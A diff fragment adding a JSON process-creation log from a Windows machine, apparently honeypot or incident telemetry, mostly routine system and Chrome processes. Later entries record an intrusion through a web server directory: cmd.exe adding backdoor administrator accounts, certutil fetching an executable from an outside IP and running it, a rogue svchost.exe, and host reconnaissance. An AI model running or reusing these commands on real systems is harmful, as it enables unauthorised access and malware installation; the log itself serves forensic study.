+      "repeat_count": 20
+    },
+    "7132_3805717.3379": {
+      "pid": "7132",
+      "parent_id": "2556",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --origin-trial-disabled-features=ConditionalFocus --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=6 --launch-time-ticks=1221646475719 --mojo-platform-channel-handle=2172 --field-trial-handle=1316,i,267746935587647917,1407363802966121102,131072 /prefetch:1",
+      "msec": "3805717.3379",
+      "repeat_count": 1
+    },
+    "2580_3805718.9510": {
+      "pid": "2580",
+      "parent_id": "2556",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --instant-process --display-capture-permissions-policy-allowed --origin-trial-disabled-features=ConditionalFocus --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=1221646477566 --mojo-platform-channel-handle=2184 --field-trial-handle=1316,i,267746935587647917,1407363802966121102,131072 /prefetch:1",
+      "msec": "3805718.9510",
+      "repeat_count": 1
+    },
+    "6268_3806064.2733": {
+      "pid": "6268",
+      "parent_id": "2556",
+      "parent_key": "3820_2342.5097",
+      "image": "chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --display-capture-permissions-policy-allowed --origin-trial-disabled-features=ConditionalFocus --disable-gpu-compositing --lang=en-GB --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=7 --launch-time-ticks=1221646822510 --mojo-platform-channel-handle=3600 --field-trial-handle=1316,i,267746935587647917,1407363802966121102,131072 /prefetch:1",
+      "msec": "3806064.2733",
+      "repeat_count": 1
+    },
+    "1728_7092631.8412": {
+      "pid": "1728",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {1987463F-3E30-45F6-907F-106CE21D2A4E} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "7092631.8412",
+      "repeat_count": 1
+    },
+    "6204_9623676.9189": {
+      "pid": "6204",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "ceipdata.exe",
+      "command_line": "C:\\Windows\\system32\\ceipdata.exe -id 1",
+      "msec": "9623676.9189",
+      "repeat_count": 1
+    },
+    "2904_10692603.6976": {
+      "pid": "2904",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {1725C1CB-45F9-4127-9216-55718C138811} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "10692603.6976",
+      "repeat_count": 1
+    },
+    "4876_10718770.2820": {
+      "pid": "4876",
+      "parent_id": "456",
+      "parent_key": null,
+      "image": "GoogleUpdate.exe",
+      "command_line": "\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /svc",
+      "msec": "10718770.2820",
+      "repeat_count": 4
+    },
+    "4088_12220605.8934": {
+      "pid": "4088",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskhost.exe",
+      "command_line": "taskhost.exe USER",
+      "msec": "12220605.8934",
+      "repeat_count": 10
+    },
+    "3944_13606750.5803": {
+      "pid": "3944",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "wsqmcons.exe",
+      "command_line": "C:\\Windows\\System32\\wsqmcons.exe ",
+      "msec": "13606750.5803",
+      "repeat_count": 1
+    },
+    "5196_13628046.6110": {
+      "pid": "5196",
+      "parent_id": "3944",
+      "parent_key": "3944_13606750.5803",
+      "image": "schtasks.exe",
+      "command_line": "C:\\Windows\\system32\\schtasks.exe /delete /f /TN \"Microsoft\\Windows\\Customer Experience Improvement Program\\Uploader\"",
+      "msec": "13628046.6110",
+      "repeat_count": 1
+    },
+    "6436_14292544.1610": {
+      "pid": "6436",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {00F1F778-EB9F-4384-8B08-4E0EEFD714EE} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "14292544.1610",
+      "repeat_count": 1
+    },
+    "2984_17892500.3949": {
+      "pid": "2984",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {F2D7AC85-B74B-4E4D-9D8E-9FA3028440F3} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "17892500.3949",
+      "repeat_count": 1
+    },
+    "3248_20609346.6928": {
+      "pid": "3248",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskhost.exe",
+      "command_line": "taskhost.exe SYSTEM",
+      "msec": "20609346.6928",
+      "repeat_count": 3
+    },
+    "6404_20807643.7424": {
+      "pid": "6404",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskhostex.exe",
+      "command_line": "taskhostex.exe ",
+      "msec": "20807643.7424",
+      "repeat_count": 1
+    },
+    "2608_21492456.6057": {
+      "pid": "2608",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {95C1BBC5-073C-40F8-853D-741CC062E408} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "21492456.6057",
+      "repeat_count": 1
+    },
+    "3228_23905976.5016": {
+      "pid": "3228",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "diagtrackrunner.exe",
+      "command_line": "C:\\Windows\\system32\\compattel\\DiagTrackRunner.exe /UploadEtlFilesOnly",
+      "msec": "23905976.5016",
+      "repeat_count": 1
+    },
+    "6844_23906088.7759": {
+      "pid": "6844",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "CompatTelRunner.exe",
+      "command_line": "C:\\Windows\\system32\\CompatTelRunner.exe ",
+      "msec": "23906088.7759",
+      "repeat_count": 1
+    },
+    "1708_25092412.9277": {
+      "pid": "1708",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {06F0285C-6AE1-4263-8374-C2E7167F956A} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "25092412.9277",
+      "repeat_count": 1
+    },
+    "6432_28692368.8715": {
+      "pid": "6432",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {06082130-0AC6-4708-8683-AC94E0DD72F5} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "28692368.8715",
+      "repeat_count": 1
+    },
+    "3404_32292575.0809": {
+      "pid": "3404",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {0876C587-EB5C-4DEA-B483-8A7C723C914A} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "32292575.0809",
+      "repeat_count": 1
+    },
+    "5652_35557546.8933": {
+      "pid": "5652",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskhostex.exe",
+      "command_line": "taskhostex.exe Regular",
+      "msec": "35557546.8933",
+      "repeat_count": 1
+    },
+    "4596_35557600.4416": {
+      "pid": "4596",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "aitagent.exe",
+      "command_line": "C:\\Windows\\system32\\aitagent.EXE /increment",
+      "msec": "35557600.4416",
+      "repeat_count": 1
+    },
+    "6740_35557613.8539": {
+      "pid": "6740",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskhost.exe",
+      "command_line": "taskhost.exe /RuntimeWide",
+      "msec": "35557613.8539",
+      "repeat_count": 1
+    },
+    "6724_35557614.9879": {
+      "pid": "6724",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "CompatTelRunner.exe",
+      "command_line": "C:\\Windows\\system32\\CompatTelRunner.exe -maintenance",
+      "msec": "35557614.9879",
+      "repeat_count": 1
+    },
+    "7020_35557649.0693": {
+      "pid": "7020",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "wermgr.exe",
+      "command_line": "C:\\Windows\\system32\\wermgr.exe -queuereporting",
+      "msec": "35557649.0693",
+      "repeat_count": 1
+    },
+    "3048_35557703.2005": {
+      "pid": "3048",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "MRT.exe",
+      "command_line": "C:\\Windows\\system32\\MRT.exe /EHB /Q",
+      "msec": "35557703.2005",
+      "repeat_count": 1
+    },
+    "5408_35557831.1809": {
+      "pid": "5408",
+      "parent_id": "6740",
+      "parent_key": "6740_35557613.8539",
+      "image": "ngentask.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\NGenTask.exe\" /RuntimeWide /StopEvent:436",
+      "msec": "35557831.1809",
+      "repeat_count": 1
+    },
+    "7104_35557833.2968": {
+      "pid": "7104",
+      "parent_id": "6740",
+      "parent_key": "6740_35557613.8539",
+      "image": "ngentask.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe\" /RuntimeWide /StopEvent:280",
+      "msec": "35557833.2968",
+      "repeat_count": 1
+    },
+    "1684_35557926.1199": {
+      "pid": "1684",
+      "parent_id": "7104",
+      "parent_key": "7104_35557833.2968",
+      "image": "ngen.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe\" RemoveTaskDelayStartTrigger /LegacyServiceBehavior",
+      "msec": "35557926.1199",
+      "repeat_count": 1
+    },
+    "7116_35557928.0232": {
+      "pid": "7116",
+      "parent_id": "5408",
+      "parent_key": "5408_35557831.1809",
+      "image": "ngen.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe\" RemoveTaskDelayStartTrigger /LegacyServiceBehavior",
+      "msec": "35557928.0232",
+      "repeat_count": 1
+    },
+    "5944_35558014.7343": {
+      "pid": "5944",
+      "parent_id": "7104",
+      "parent_key": "7104_35557833.2968",
+      "image": "ngen.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.exe\" ExecuteQueuedItems /LegacyServiceBehavior",
+      "msec": "35558014.7343",
+      "repeat_count": 1
+    },
+    "1728_35558225.3247": {
+      "pid": "1728",
+      "parent_id": "5408",
+      "parent_key": "5408_35557831.1809",
+      "image": "ngen.exe",
+      "command_line": "\"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ngen.exe\" ExecuteQueuedItems /LegacyServiceBehavior",
+      "msec": "35558225.3247",
+      "repeat_count": 1
+    },
+    "3528_35558375.2896": {
+      "pid": "3528",
+      "parent_id": "456",
+      "parent_key": null,
+      "image": "svchost.exe",
+      "command_line": "C:\\Windows\\System32\\svchost.exe -k WerSvcGroup",
+      "msec": "35558375.2896",
+      "repeat_count": 1
+    },
+    "6596_35558380.5304": {
+      "pid": "6596",
+      "parent_id": "3528",
+      "parent_key": "3528_35558375.2896",
+      "image": "WerFault.exe",
+      "command_line": "\"C:\\Windows\\system32\\WerFault.exe\" -k -lcq",
+      "msec": "35558380.5304",
+      "repeat_count": 1
+    },
+    "1244_35561065.4014": {
+      "pid": "1244",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "lpremove.exe",
+      "command_line": "C:\\Windows\\system32\\lpremove.exe ",
+      "msec": "35561065.4014",
+      "repeat_count": 1
+    },
+    "7024_35892437.5545": {
+      "pid": "7024",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {947D8B3D-8256-4A75-9295-ACB07496BF88} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "35892437.5545",
+      "repeat_count": 1
+    },
+    "3468_39492424.9962": {
+      "pid": "3468",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {E3FCD572-636A-4269-9567-F8E8668F0C37} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "39492424.9962",
+      "repeat_count": 1
+    },
+    "4644_43092381.0872": {
+      "pid": "4644",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {51A848AA-1133-4A5B-8232-1FBF794FAC45} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "43092381.0872",
+      "repeat_count": 1
+    },
+    "5336_46692337.3385": {
+      "pid": "5336",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {A5506531-9904-4999-9CD0-51627FDE34E5} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "46692337.3385",
+      "repeat_count": 1
+    },
+    "1488_50172027.5404": {
+      "pid": "1488",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" 2>&1\"",
+      "msec": "50172027.5404",
+      "repeat_count": 1
+    },
+    "6660_50172041.0118": {
+      "pid": "6660",
+      "parent_id": "1488",
+      "parent_key": "1488_50172027.5404",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d \"D:/phpStudy/WWW\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" ",
+      "msec": "50172041.0118",
+      "repeat_count": 1
+    },
+    "7036_50172044.7003": {
+      "pid": "7036",
+      "parent_id": "6660",
+      "parent_key": "6660_50172041.0118",
+      "image": "net.exe",
+      "command_line": "net  user nbb nb123. /add",
+      "msec": "50172044.7003",
+      "repeat_count": 1
+    },
+    "3620_50172049.1826": {
+      "pid": "3620",
+      "parent_id": "7036",
+      "parent_key": "7036_50172044.7003",
+      "image": "net1.exe",
+      "command_line": "C:\\Windows\\system32\\net1  user nbb nb123. /add",
+      "msec": "50172049.1826",
+      "repeat_count": 1
+    },
+    "5292_50172070.5231": {
+      "pid": "5292",
+      "parent_id": "6660",
+      "parent_key": "6660_50172041.0118",
+      "image": "net.exe",
+      "command_line": "net  localgroup administrators nbb /add",
+      "msec": "50172070.5231",
+      "repeat_count": 1
+    },
+    "6268_50172074.7990": {
+      "pid": "6268",
+      "parent_id": "5292",
+      "parent_key": "5292_50172070.5231",
+      "image": "net1.exe",
+      "command_line": "C:\\Windows\\system32\\net1  localgroup administrators nbb /add",
+      "msec": "50172074.7990",
+      "repeat_count": 1
+    },
+    "4416_50262410.8667": {
+      "pid": "4416",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" 2>&1\"",
+      "msec": "50262410.8667",
+      "repeat_count": 1
+    },
+    "932_50262418.4645": {
+      "pid": "932",
+      "parent_id": "4416",
+      "parent_key": "4416_50262410.8667",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d \"D:/phpStudy/WWW\"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" ",
+      "msec": "50262418.4645",
+      "repeat_count": 1
+    },
+    "3840_50262426.9490": {
+      "pid": "3840",
+      "parent_id": "932",
+      "parent_key": "932_50262418.4645",
+      "image": "certutil.exe",
+      "command_line": "certutil.exe  -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+      "msec": "50262426.9490",
+      "repeat_count": 1
+    },
+    "7084_50263487.5294": {
+      "pid": "7084",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" 2>&1\"",
+      "msec": "50263487.5294",
+      "repeat_count": 1
+    },
+    "6880_50263494.9479": {
+      "pid": "6880",
+      "parent_id": "7084",
+      "parent_key": "7084_50263487.5294",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d \"D:/phpStudy/WWW\"&C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" ",
+      "msec": "50263494.9479",
+      "repeat_count": 1
+    },
+    "3636_50263501.0530": {
+      "pid": "3636",
+      "parent_id": "6880",
+      "parent_key": "6880_50263494.9479",
+      "image": "ywm.exe",
+      "command_line": "C:\\Windows\\ywm.exe",
+      "msec": "50263501.0530",
+      "repeat_count": 1
+    },
+    "4920_50263583.7822": {
+      "pid": "4920",
+      "parent_id": "456",
+      "parent_key": null,
+      "image": "svchost.exe",
+      "command_line": "C:\\Windows\\svchost.exe",
+      "msec": "50263583.7822",
+      "repeat_count": 1
+    },
+    "2616_50263662.8629": {
+      "pid": "2616",
+      "parent_id": "4920",
+      "parent_key": "4920_50263583.7822",
+      "image": "svchost.exe",
+      "command_line": "C:\\Windows\\svchost.exe Win7",
+      "msec": "50263662.8629",
+      "repeat_count": 1
+    },
+    "6980_50292293.4657": {
+      "pid": "6980",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {C821D1FD-90E5-4B83-927F-8CB86D8B0D6A} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "50292293.4657",
+      "repeat_count": 1
+    },
+    "5736_50297903.8155": {
+      "pid": "5736",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&wmic cpu get NumberOfLogicalProcessors&echo [S]&cd&echo [E]\" 2>&1\"",
+      "msec": "50297903.8155",
+      "repeat_count": 1
+    },
+    "4560_50297911.4129": {
+      "pid": "4560",
+      "parent_id": "5736",
+      "parent_key": "5736_50297903.8155",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d \"D:/phpStudy/WWW\"&wmic cpu get NumberOfLogicalProcessors&echo [S]&cd&echo [E]\" ",
+      "msec": "50297911.4129",
+      "repeat_count": 1
+    },
+    "6428_50297919.0280": {
+      "pid": "6428",
+      "parent_id": "4560",
+      "parent_key": "4560_50297911.4129",
+      "image": "WMIC.exe",
+      "command_line": "wmic  cpu get NumberOfLogicalProcessors",
+      "msec": "50297919.0280",
+      "repeat_count": 2
+    },
+    "3352_50298559.7165": {
+      "pid": "3352",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&systeminfo|find \"\ufffd\ufffd\ufffd\ufffd\ufffd\u06b4\ufffd\ufffd\ufffd\ufffd\ufffd\"&echo [S]&cd&echo [E]\" 2>&1\"",
+      "msec": "50298559.7165",
+      "repeat_count": 1
+    },
+    "5436_50298566.8859": {
+      "pid": "5436",
+      "parent_id": "3352",
+      "parent_key": "3352_50298559.7165",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d \"D:/phpStudy/WWW\"&systeminfo|find \"\ufffd\ufffd\ufffd\ufffd\ufffd\u06b4\ufffd\ufffd\ufffd\ufffd\ufffd\"&echo [S]&cd&echo [E]\" ",
+      "msec": "50298566.8859",
+      "repeat_count": 1
+    },
+    "4320_50298572.5342": {
+      "pid": "4320",
+      "parent_id": "5436",
+      "parent_key": "5436_50298566.8859",
+      "image": "systeminfo.exe",
+      "command_line": "systeminfo",
+      "msec": "50298572.5342",
+      "repeat_count": 1
+    },
+    "1796_50298574.9888": {
+      "pid": "1796",
+      "parent_id": "5436",
+      "parent_key": "5436_50298566.8859",
+      "image": "find.exe",
+      "command_line": "find  \"\ufffd\ufffd\ufffd\ufffd\ufffd\u06b4\ufffd\ufffd\ufffd\ufffd\ufffd\"",
+      "msec": "50298574.9888",
+      "repeat_count": 1
+    },
+    "5856_50299740.8472": {
+      "pid": "5856",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "WmiPrvSE.exe",
+      "command_line": "C:\\Windows\\sysWOW64\\wbem\\wmiprvse.exe -secured -Embedding",
+      "msec": "50299740.8472",
+      "repeat_count": 1
+    },
+    "3752_50300070.1934": {
+      "pid": "3752",
+      "parent_id": "456",
+      "parent_key": null,
+      "image": "TrustedInstaller.exe",
+      "command_line": "C:\\Windows\\servicing\\TrustedInstaller.exe",
+      "msec": "50300070.1934",
+      "repeat_count": 2
+    },
+    "1144_50300103.3757": {
+      "pid": "1144",
+      "parent_id": "524",
+      "parent_key": null,
+      "image": "TiWorker.exe",
+      "command_line": "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.19724_none_fa5e641b9b111ab1\\TiWorker.exe -Embedding",
+      "msec": "50300103.3757",
+      "repeat_count": 2
+    },
+    "6640_50612413.6821": {
+      "pid": "6640",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&tasklist /svc | findstr TermService&echo [S]&cd&echo [E]\" 2>&1\"",
+      "msec": "50612413.6821",
+      "repeat_count": 1
+    },
+    "7156_50612421.2839": {
+      "pid": "7156",
+      "parent_id": "6640",
+      "parent_key": "6640_50612413.6821",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d \"D:/phpStudy/WWW\"&tasklist /svc | findstr TermService&echo [S]&cd&echo [E]\" ",
+      "msec": "50612421.2839",
+      "repeat_count": 1
+    },
+    "3556_50612454.0614": {
+      "pid": "3556",
+      "parent_id": "7156",
+      "parent_key": "7156_50612421.2839",
+      "image": "tasklist.exe",
+      "command_line": "tasklist  /svc ",
+      "msec": "50612454.0614",
+      "repeat_count": 2
+    },
+    "5300_50612480.3740": {
+      "pid": "5300",
+      "parent_id": "7156",
+      "parent_key": "7156_50612421.2839",
+      "image": "findstr.exe",
+      "command_line": "findstr  TermService",
+      "msec": "50612480.3740",
+      "repeat_count": 1
+    },
+    "6276_50612721.7533": {
+      "pid": "6276",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&netstat -ano | findstr 88&echo [S]&cd&echo [E]\" 2>&1\"",
+      "msec": "50612721.7533",
+      "repeat_count": 1
+    },
+    "6632_50612728.8923": {
+      "pid": "6632",
+      "parent_id": "6276",
+      "parent_key": "6276_50612721.7533",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d \"D:/phpStudy/WWW\"&netstat -ano | findstr 88&echo [S]&cd&echo [E]\" ",
+      "msec": "50612728.8923",
+      "repeat_count": 1
+    },
+    "2092_50612781.1046": {
+      "pid": "2092",
+      "parent_id": "6632",
+      "parent_key": "6632_50612728.8923",
+      "image": "NETSTAT.EXE",
+      "command_line": "netstat  -ano ",
+      "msec": "50612781.1046",
+      "repeat_count": 2
+    },
+    "6284_50612782.0754": {
+      "pid": "6284",
+      "parent_id": "6632",
+      "parent_key": "6632_50612728.8923",
+      "image": "findstr.exe",
+      "command_line": "findstr  88",
+      "msec": "50612782.0754",
+      "repeat_count": 1
+    },
+    "5084_50868691.4095": {
+      "pid": "5084",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&net user oop o33 /add&echo [S]\" 2>&1",
+      "msec": "50868691.4095",
+      "repeat_count": 1
+    },
+    "6764_50868698.7697": {
+      "pid": "6764",
+      "parent_id": "5084",
+      "parent_key": "5084_50868691.4095",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d D:/phpStudy/WWW/&net user oop o33 /add&echo [S]\" ",
+      "msec": "50868698.7697",
+      "repeat_count": 1
+    },
+    "2096_50868702.6544": {
+      "pid": "2096",
+      "parent_id": "6764",
+      "parent_key": "6764_50868698.7697",
+      "image": "net.exe",
+      "command_line": "net  user oop o33 /add",
+      "msec": "50868702.6544",
+      "repeat_count": 1
+    },
+    "3284_50868707.0839": {
+      "pid": "3284",
+      "parent_id": "2096",
+      "parent_key": "2096_50868702.6544",
+      "image": "net1.exe",
+      "command_line": "C:\\Windows\\system32\\net1  user oop o33 /add",
+      "msec": "50868707.0839",
+      "repeat_count": 1
+    },
+    "6244_50937202.0779": {
+      "pid": "6244",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&tasklist /svc | find \"Ter\"&echo [S]\" 2>&1",
+      "msec": "50937202.0779",
+      "repeat_count": 1
+    },
+    "6204_50937209.4422": {
+      "pid": "6204",
+      "parent_id": "6244",
+      "parent_key": "6244_50937202.0779",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d D:/phpStudy/WWW/&tasklist /svc | find \"Ter\"&echo [S]\" ",
+      "msec": "50937209.4422",
+      "repeat_count": 1
+    },
+    "924_50937214.0426": {
+      "pid": "924",
+      "parent_id": "6204",
+      "parent_key": "6204_50937209.4422",
+      "image": "find.exe",
+      "command_line": "find  \"Ter\"",
+      "msec": "50937214.0426",
+      "repeat_count": 1
+    },
+    "1324_50937346.8600": {
+      "pid": "1324",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"&echo [S]\" 2>&1",
+      "msec": "50937346.8600",
+      "repeat_count": 1
+    },
+    "1444_50937355.8575": {
+      "pid": "1444",
+      "parent_id": "1324",
+      "parent_key": "1324_50937346.8600",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d D:/phpStudy/WWW/&netstat -ano | find \"88\"&echo [S]\" ",
+      "msec": "50937355.8575",
+      "repeat_count": 1
+    },
+    "5080_50937361.1943": {
+      "pid": "5080",
+      "parent_id": "1444",
+      "parent_key": "1444_50937355.8575",
+      "image": "find.exe",
+      "command_line": "find  \"88\"",
+      "msec": "50937361.1943",
+      "repeat_count": 1
+    },
+    "1144_51007158.9857": {
+      "pid": "1144",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors&echo [S]\" 2>&1",
+      "msec": "51007158.9857",
+      "repeat_count": 1
+    },
+    "6680_51007166.3185": {
+      "pid": "6680",
+      "parent_id": "1144",
+      "parent_key": "1144_51007158.9857",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d D:/phpStudy/WWW/&wmic cpu get NumberOfLogicalProcessors&echo [S]\" ",
+      "msec": "51007166.3185",
+      "repeat_count": 1
+    },
+    "288_51007232.0561": {
+      "pid": "288",
+      "parent_id": "3492",
+      "parent_key": null,
+      "image": "cmd.exe",
+      "command_line": "cmd.exe /c cmd /c \"cd /d D:/phpStudy/WWW/&wmic memorychip get capacity&echo [S]\" 2>&1",
+      "msec": "51007232.0561",
+      "repeat_count": 1
+    },
+    "704_51007238.9483": {
+      "pid": "704",
+      "parent_id": "288",
+      "parent_key": "288_51007232.0561",
+      "image": "cmd.exe",
+      "command_line": "cmd  /c \"cd /d D:/phpStudy/WWW/&wmic memorychip get capacity&echo [S]\" ",
+      "msec": "51007238.9483",
+      "repeat_count": 1
+    },
+    "4252_51007242.5569": {
+      "pid": "4252",
+      "parent_id": "704",
+      "parent_key": "704_51007238.9483",
+      "image": "WMIC.exe",
+      "command_line": "wmic  memorychip get capacity",
+      "msec": "51007242.5569",
+      "repeat_count": 1
+    },
+    "3404_53892249.7181": {
+      "pid": "3404",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {B300FFC9-41D6-4406-9D68-94CE8940D12B} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "53892249.7181",
+      "repeat_count": 1
+    },
+    "4876_57492205.8892": {
+      "pid": "4876",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {E036329C-2064-40C8-8255-3F0D4E953978} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "57492205.8892",
+      "repeat_count": 1
+    },
+    "2096_61092146.3717": {
+      "pid": "2096",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {BAE09C72-3969-454B-8D72-08ADA3182BC5} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "61092146.3717",
+      "repeat_count": 1
+    },
+    "7068_64692352.5394": {
+      "pid": "7068",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {AB1C3E24-AE01-4749-8250-20BDB318AF39} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "64692352.5394",
+      "repeat_count": 1
+    },
+    "924_67315629.2027": {
+      "pid": "924",
+      "parent_id": "456",
+      "parent_key": null,
+      "image": "sppsvc.exe",
+      "command_line": "C:\\Windows\\system32\\sppsvc.exe",
+      "msec": "67315629.2027",
+      "repeat_count": 1
+    },
+    "5356_68292230.6853": {
+      "pid": "5356",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
+      "command_line": "taskeng.exe {BAA0B28C-6372-420E-8067-FA0741C99413} S-1-5-18:NT AUTHORITY\\System:Service:",
+      "msec": "68292230.6853",
+      "repeat_count": 1
+    },
+    "2752_71892218.1182": {
+      "pid": "2752",
+      "parent_id": "716",
+      "parent_key": null,
+      "image": "taskeng.exe",
